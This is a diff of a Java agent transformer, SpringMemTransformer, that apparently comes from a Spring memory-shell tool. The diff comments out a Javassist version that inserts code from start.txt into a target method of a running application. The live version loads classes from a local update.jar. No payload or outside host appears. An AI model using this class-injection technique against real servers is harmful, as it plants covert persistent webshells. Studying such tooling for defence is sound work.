@@ -1,6 +1,6 @@
 package com.stdout.springMem;
 
-import com.stdout.Utils.MyReader;
+import com.stdout.Utils.Redefine.MyReader;
 
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.IllegalClassFormatException;
@@ -16,10 +16,37 @@ public class SpringMemTransformer implements ClassFileTransformer {
     public static final String TransformedEqualName = SpringMemShell.TransformedClassName.replace(".", "/");
     public static final String TransformedMethodName = SpringMemShell.TransformedMethodName;
 
+//    @Override
+//    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+//        if (className.equals(TransformedEqualName)) {
+//            try {
+//                ClassPool cp = ClassPool.getDefault();
+//                if (classBeingRedefined != null) {
+//                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
+//                    cp.insertClassPath(ccp);
+//                }
+//                CtClass cc = cp.get(TransformedClassName);
+//                CtMethod m = cc.getDeclaredMethod(TransformedMethodName);
+//                m.insertBefore(MyReader.readSource("start.txt"));
+//                byte[] byteCode = cc.toBytecode();
+//                cc.detach();
+//                return byteCode;
+//            } catch (NotFoundException e) {
+//                e.printStackTrace();
+//            } catch (CannotCompileException e) {
+//                e.printStackTrace();
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//            }
+//        }
+//        return null;
+//    }
+
     @Override
     public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
         URL url = null;
         try {
+
             url = new URL("file:./update.jar");
             URLClassLoader classLoader = new URLClassLoader(new URL[] {url}, Thread.currentThread().getContextClassLoader());
 
@@ -73,5 +100,6 @@ public class SpringMemTransformer implements ClassFileTransformer {
         }
         return null;
     }
+
 
 }
